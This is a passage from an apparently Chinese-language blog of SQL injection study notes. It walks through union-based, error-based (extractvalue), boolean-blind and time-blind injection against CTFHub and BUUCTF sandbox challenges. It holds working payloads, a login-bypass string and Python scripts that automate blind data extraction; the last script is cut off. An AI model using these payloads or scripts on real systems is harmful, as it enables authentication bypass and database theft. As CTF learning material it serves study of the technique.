alt="HgvAr8.md.png"></a></li></ol><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="判断能否根据输入的不同结果不同"><a href="#判断能否根据输入的不同结果不同" class="headerlink" title="判断能否根据输入的不同结果不同"></a>判断能否根据输入的不同结果不同</h3><ol><li>输入1，2，3…看是否有不同的数据</li></ol><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><ol><li>1 and 1=1;和1 and 1=2都没错</li><li>1’ and 1=1 –+ 没有问题</li><li>1’ and 1=2 –+报错</li><li>报错是爆出语法错误</li><li>后面加上–+是为了产生闭合，屏蔽掉后面的多余单引号</li></ol><h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><ol><li>?id=1’ order by 2 没问题</li><li>?id=1’ order by 3 有问题</li></ol><h3 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol><li>?id=1’ and 1=2 union select 1,database() –+</li><li>得到数据库名为sqli</li></ol><h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><ol><li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,table_name)) from information_schema.tables where table_name=’flag’ –+</li></ol><h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3><ol><li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,flag)) from sqli.flag</li><li><a href="https://imgtu.com/i/H2sSTH"><img src="https://s4.ax1x.com/2022/02/15/H2sSTH.md.png" alt="H2sSTH.md.png"></a></li></ol><h3 id="buuctf中的warmup"><a href="#buuctf中的warmup" class="headerlink" title="buuctf中的warmup"></a>buuctf中的warmup</h3><ol><li>输入1和1’来判断是字符型还是数字型，发现是字符型注入</li><li>使用1’ or 1=1 #来万能绕过</li></ol><h2 id="万能语句绕过有用户名密码的SQL注入"><a href="#万能语句绕过有用户名密码的SQL注入" class="headerlink" title="万能语句绕过有用户名密码的SQL注入"></a>万能语句绕过有用户名密码的SQL注入</h2><ol><li><p>万能语句：</p>  <pre class="line-numbers language-none"><code class="language-none">1&#39; or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>假设sql语句为</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"selet * from users where username='<span class="token interpolation"><span class="token variable">$_name</span></span>' and password='<span class="token interpolation"><span class="token variable">$_pwd</span></span>'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果在变量name中传入</p>  <pre class="line-numbers language-none"><code class="language-none">&#39; or 1&#x3D;1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>那么最后语句会变成</p>  <pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;&#39; or 1&#x3D;1# &#39; and password&#x3D;balabala;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>去掉注释后的内容后，语句变为</p>  <pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;&#39; or 1&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  因为1=1恒为真，所以where中的查询条件相当于没有</p></li><li><p>所以语句相当于</p>  <pre class="line-numbers language-none"><code class="language-none">select * from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>假设语句为</p>  <pre class="line-numbers language-none"><code class="language-none">&quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>id值传入</p>  <pre class="line-numbers language-none"><code class="language-none">admin&#39; or 1&#x3D;1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>则后面的语句变为</p>  <pre class="line-numbers language-none"><code class="language-none">&quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;admin&#39; or 1&#x3D;1 # &#39; limit 1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  即limit 1限制和where语句中username != flag的限制都不再起作用</p></li><li><p>原语句变为如下，爆出所有结果</p>  <pre class="line-numbers language-none"><code class="language-none">select username,password from user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240429224729.png"></p></li></ol><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><ol><li>extractvalue():从目标xml中返回包含所查询的字符串</li><li>EXTRACTVALUE(XML_document,XPath_string)</li><li>第一个参数：XML_document是String格式，为XML文档对象的名称</li><li>第二个参数：Xpath_string(xpath格式的字符串)</li><li>concat:返回结果为连接参数产生的字符串</li></ol><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><ol><li>updatexml(xml_document,xpath_string,new_value)</li><li>第一个参数：xml_document是string格式，为xml文档对象的名称</li><li>第二个参数：xpath_string</li><li>第三个参数：new_value,string格式，替换查找到符合条件的数据</li></ol><h4 id="用database-爆数据库"><a href="#用database-爆数据库" class="headerlink" title="用database()爆数据库"></a>用database()爆数据库</h4><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ol><li>information_schema.tables所有表名</li><li>information_schema.columns所有列名</li></ol><h1 id="table"><a href="#table" class="headerlink" title="table"></a>table</h1><ol><li>table_schema=’数据库名字’,数据库的名称</li><li>table_name=’表的名字’,查询满足某些条件的表名</li><li>table_type表的类型</li></ol><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue函数原理"><a href="#extractvalue函数原理" class="headerlink" title="extractvalue函数原理"></a>extractvalue函数原理</h3><ol><li>对xml文件进行查询的函数，会从xml文件中返回所包含查询值的字符串，语法：<pre class="line-numbers language-none"><code class="language-none">extractvalue(&#39;xml_document&#39;,&#39;Xpath_string&#39;)extractvalue(&#39;目标文件名&#39;,&#39;在xml中查询的字符串&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>第二个参数要求是xpath格式的字符串，语法正确是会按照路径 <strong>/该xml文件/要查询的字符串</strong> 进行查询 </li><li>如果我们输入的Xpath_string不对就会报错，而如果页面回显sql报错信息就可以得到我们想要的信息了，<strong>0x7e是~，是不属于xpath语法的格式</strong>，因此会爆出xpath语法错误</li><li>此处的xml_document可以是anything，<strong>填1是因为没有文件名为1的xml文件</strong></li></ol><h3 id="而如果页面回显sql报错信息就可以得到我们想要的信息了"><a href="#而如果页面回显sql报错信息就可以得到我们想要的信息了" class="headerlink" title="而如果页面回显sql报错信息就可以得到我们想要的信息了"></a>而如果页面回显sql报错信息就可以得到我们想要的信息了</h3><ol><li>  注意必须是XPATH的error，不是syntax的error</li><li>  即必须是xpath路径错误，不能是语法错误</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240430150734.png"></li></ol><h3 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h3><ol><li>使用concat函数（将两个或多个字符串合并成一个字符串）拼接一个错误的Xpath让mysql报错得到包含查询值的字符串<pre class="line-numbers language-none"><code class="language-none">select(extractvalue(1,concat(0x7e,database)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>修改database()部分可以爆表，列，值</li><li>concat存在的意义就是让extractvalue函数的第二个参数出错，所以concat拼接的参数是个非法字符就行</li></ol><h4 id="extractvalue函数一次只能查询32长度"><a href="#extractvalue函数一次只能查询32长度" class="headerlink" title="extractvalue函数一次只能查询32长度"></a>extractvalue函数一次只能查询32长度</h4><ol><li>所以在爆表，列，值的时候需要加上limit x,1逐一查询（<strong>limit m,n跳过前m项数据后获取n条记录</strong>）<pre class="line-numbers language-none"><code class="language-none">假设有三列select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &#39;security&#39; limit 0,1&#x2F;1,1&#x2F;2,1))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h5 id="例题ctfshow报错注入"><a href="#例题ctfshow报错注入" class="headerlink" title="例题ctfshow报错注入"></a>例题ctfshow报错注入</h5><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-cd4501bf2d967240.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,database())) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/06/30/L6tXebY2BRmcihF.png"></p><ol start="2"><li><p>当有多行数据时，一定要limit控制有几行输出，最好一行一行输出</p></li><li><p><img src="https://s2.loli.net/2022/06/30/AofUYCxwuaN87Sl.png"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; limit 0,1)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><a href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag’ limit 0,1)))–+</p></li><li><p><a href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1))) –+<br><img src="https://s2.loli.net/2022/06/30/CIZz2LtPobcvmsf.png"></p></li><li><p><a href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 1,1))) –+</p></li><li><p>然后就爆完了 ctfhub{a6bceb2015a931e029a2d182</p></li></ol><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol><li><p>所谓盲注就是在服务器没有错误回显的时候完成注入攻击。</p></li><li><p>原理：boolean 根据注入信息返回true or false 没有任何报错信息</p></li><li><p>即布尔盲注一般适用于页面没有回显字段(不支持联合查询)，<strong>且web页面返回True或者false</strong>，构造SQL语句，<strong>利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false</strong>，从而达到注入的目的来<strong>获取信息</strong>的一种方法</p></li><li><p>逐位判断使用substring函数，第一个参数是列的名字，第二个参数是起始位置，第三个参数是截取的长度</p> <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> SUBSTRING<span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> position<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> single_character<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-none"><code class="language-none">playload：and length(database()) &#x3D;8 --+ &#x2F;判断数据库名长度是否等于8如果不等于则返回错，并且返回index.php如果等于就返回query_success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>如果是错误，会回显报错</li><li>如果是正确的，会返回开始页面</li></ol><h3 id="例题：ctfhub布尔盲注"><a href="#例题：ctfhub布尔盲注" class="headerlink" title="例题：ctfhub布尔盲注"></a>例题：ctfhub布尔盲注</h3><ol><li><p>这一道题我看其它人的wp是数据库为空时还会返回空，一般情况下是数据库为空或者查询语句报错时都会报错，所以应该先判断空时是否会报错?id=1 and 0=1 –+</p></li><li><p><strong>判断数据库名字的长度</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 3 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></p></li><li><p><strong>判断数据库名字的长度</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 4 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></p></li><li><p><strong>逐位判断</strong>数据库的名字，使用substring函数</p></li></ol>  <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-d1fc647b75cf070a.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and substring(database(),1,1) &#x3D; &#39;s&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240430160159.png"></p></li><li><p><strong>判断数据库名字</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and database() = ‘sqli’ –+<br><img src="https://s2.loli.net/2022/06/30/Y9RJbZPQgTdApBn.png"></p></li><li><p><strong>判断数据库中表的名字</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select table_name from information_schema.tables where table_schema=’sqli’ limit 0,1) = ‘flag’ –+ <strong>这个地方加limit 0,1是因为不只有一个表</strong><br><img src="https://s2.loli.net/2022/06/30/1CJVp3ueS5MZlbf.png"></p></li><li><p><strong>判断flag表中字段的名字</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select column_name from information_schema.columns where table_name=’flag’ limit 0,1) = ‘flag’ –+<br><img src="https://s2.loli.net/2022/06/30/rXfJiRvAY9UZT62.png"></p></li><li><p>后面实在是写不出来了，就跑一下吧</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurlOPEN &#x3D; &#39;http:&#x2F;&#x2F;challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;&#39;starOperatorTime &#x3D; [] mark &#x3D; &#39;query_success&#39; def database_name():name &#x3D; &#39;&#39;for j in range(1,9):for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:url &#x3D; urlOPEN+&#39;if(substr(database(),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(j,i)# print(url+&#39;%23&#39;)r &#x3D; requests.get(url)if mark in r.text:name &#x3D; name+iprint(name)breakprint(&#39;database_name:&#39;,name)database_name() def table_name():    list &#x3D; []    for k in range(0,4):        name&#x3D;&#39;&#39;        for j in range(1,9):            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:                url &#x3D; urlOPEN+&#39;if(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)    # print(url+&#39;%23&#39;)                r &#x3D; requests.get(url)                if mark in r.text:                    name &#x3D; name+i                    break        list.append(name)    print(&#39;table_name:&#39;,list)#start &#x3D; time.time()table_name()#stop &#x3D; time.time()#starOperatorTime.append(stop-start)#print(&quot;所用的平均时间： &quot; + str(sum(starOperatorTime)&#x2F;100))def column_name():    list &#x3D; []    for k in range(0,3): #判断表里最多有4个字段        name&#x3D;&#39;&#39;        for j in range(1,9): #判断一个 字段名最多有9个字符组成            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:                url&#x3D;urlOPEN+&#39;if(substr((select column_name from information_schema.columns where table_name&#x3D;&quot;flag&quot;and table_schema&#x3D; database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)                r&#x3D;requests.get(url)                if mark in r.text:                    name&#x3D;name+i                    break        list.append(name)    print (&#39;column_name:&#39;,list)column_name()def get_data():        name&#x3D;&#39;&#39;        for j in range(1,50): #判断一个值最多有51个字符组成            for i in range(48,126):                url&#x3D;urlOPEN+&#39;if(ascii(substr((select flag from flag),%d,1))&#x3D;%d,1,(select table_name from information_schema.tables))&#39; %(j,i)                r&#x3D;requests.get(url)                if mark in r.text:                    name&#x3D;name+chr(i)                    print(name)                    break        print (&#39;value:&#39;,name)    get_data()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>最后用这个脚本跑出来了</p><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><pre class="line-numbers language-none"><code class="language-none">一.1.count()函数：统计查询结果的数量；2.length(str)函数：返回字符串 str的长度；3.left()函数： left(database(),1)&#x3D;‘s’ left(a,b)从左侧截取a的前b位，正确则返回1，错误返回0left((select database()),1)&#x3D;‘s’ 同样的意思4.regexp : select user() regexp ‘r’; user()的结果是root@localhost，regexp为匹配root的正则表达式5.like : select user() like ‘ro%’; 匹配与regexp相似6.substr(a,b,c): select substr() xxxx; substr(a,b,c)从位置b开始，截取a字符串的c位长度7.mid(a,b,c): select mid(user(),1,2); mid(a,b,c)从位置b开始，截取a字符串的c位长度8.ascii() 将某个字符转化为其ascii值9.limit 0,1：元素索引是从0开始（不是1） 从元素索引位置为1的数据（即第2位）开始输出一个值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol><li>由于服务器端拼接了SQL语句，且<strong>正确和错误存在同样的回显</strong>，即是错误信息被过滤，可以通过<strong>页面响应时间进行按位判断数据</strong>。由于时间盲注中的函数是在数据库中执行的，但是sleep函数或者benchmark函数的过多执行会让服务器负载过高</li></ol><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li>通过一个页面加载的时间延时来判断</li><li>但是这和网络，性能，设置的延时长短有关系</li><li>当对数据库进行查询操作，如果查询的条件不存在，语句执行的速度非常快，执行时间基本可以认为是0，通过控制sql语句的执行时间来判断</li><li>我认为就是后端设置，当不设置延时的时候，语句执行就会非常快，执行时间基本可以认为是0</li></ol><h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><h4 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h4><h4 id="if-exp1-exp2-exp3"><a href="#if-exp1-exp2-exp3" class="headerlink" title="if(exp1,exp2,exp3)"></a>if(exp1,exp2,exp3)</h4><ol><li>当exp1的值为true时会执行exp2,否则会执行exp3</li></ol><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><ol><li>睡眠函数，可以使查询数据时回显数据的相应时间加长</li><li>sleep(N) 这里N是睡眠的时间</li><li>使用时可以配合if使用<pre class="line-numbers language-none"><code class="language-none">if(ascii(substr(user(),1,1)) &#x3D; 114,sleep(5),2) 这句话的意思是，如果user()中的第一个字符的ascii码为114时，睡眠5s，否则输出2，需要注意的是，这5s是在服务器的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h4><ol><li>benchmark函数原本是用来重复执行某个语句的函数</li><li>benchmark(N,expression)</li><li>N是执行的次数，expression是表达式，如果需要进行盲注，通常需要进行消耗时间和性能的计算，例如哈希计算函数MD5，将MD5函数重复执行数万次则可以达到延迟的效果，而具体的情况需要根据不同比赛的服务器性能来决定</li></ol><h3 id="ascii码对照表"><a href="#ascii码对照表" class="headerlink" title="ascii码对照表"></a>ascii码对照表</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240429103404.png"></li></ol><h3 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h3><h4 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h4><ol><li><p>和1=2返回页面相同，说明不是布尔盲注，是时间盲注</p><pre class="line-numbers language-none"><code class="language-none">1&#39; and 1&#x3D;1 --+ 页面返回有数据1&#39; and 1&#x3D;2 --+ 页面返回也有数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断可以使用的注入方法</p><pre class="line-numbers language-none"><code class="language-none">sleep()判断能否利用时间盲注1&#39; and sleep(5) --+ 页面延时了，则为时间盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>猜数据库名称长度</p><pre class="line-numbers language-none"><code class="language-none">1&#39; and if(length(database()) &#x3D; 10,sleep(5),1) --+ 页面延时了，则当前数据库名称长度为10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>猜测数据库名称(ASCII码)</p><pre class="line-numbers language-none"><code class="language-none">1&#39; and if(ascii(substr(database()))&#x3D;107,sleep(5),1) --+ 如果页面延时了，则第一个字符的ascii码值为107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h3><ol><li>判断长度<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1) --+ 如果页面窗口转了10s，说明长度为8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>猜测字符（<strong>数据库名</strong>第一位）<br>?id=1’ and if(mid(database(),1,1)=’s’,10,0) –+ 如果页面跳转了10s，说明database的第一个字符为s</li><li>猜测字符(<strong>猜测第一个表名</strong>的第一位)</li></ol><h3 id="例题-ctfhub时间盲注"><a href="#例题-ctfhub时间盲注" class="headerlink" title="例题:ctfhub时间盲注"></a>例题:ctfhub时间盲注</h3><ol><li><p>判断数据库名字长度<br><img src="https://s2.loli.net/2022/07/02/HZmto3NRM4vAlcS.png"></p></li><li><p>用二分法逐个字符判断数据库名字，例如这个地方先判断了第一个字符是s，（<strong>ascii(s) = 115</strong>）<br><img src="https://s2.loli.net/2022/07/02/ONKdQMlPenB8YoE.png"><br><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></p></li><li><p>判断数据库中表的个数</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;) &#x3D; 2,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></p></li><li><p>逐个字符判断数据库中表的名字，(此处ascii(f) = 102)</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 102,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/02/fOi4p3JN1MxbqGH.png"></p></li><li><p>猜测flag表的字段数</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(column_name) from information_schema.columns where table_name &#x3D; &#39;flag&#39;) &#x3D; 1,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>脚本全部代码</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotebase_url <span class="token operator">=</span> <span class="token string">"http://challenge-8b83743abf473c1b.sandbox.ctfhub.com:10800/?id="</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://challenge-59668c27594f7541.sandbox.ctfhub.com:10800/"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_database_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    length <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if(length(database()) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>        url <span class="token operator">=</span> base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token comment">#很重要，因为id中有许多特殊字符，比如#，需要进行url编码</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>            length<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库名的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">return</span> length<span class="token keyword">def</span> <span class="token function">get_database</span><span class="token punctuation">(</span>database_length<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    database <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> database_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            id_equal <span class="token operator">=</span> <span class="token string">"1 and 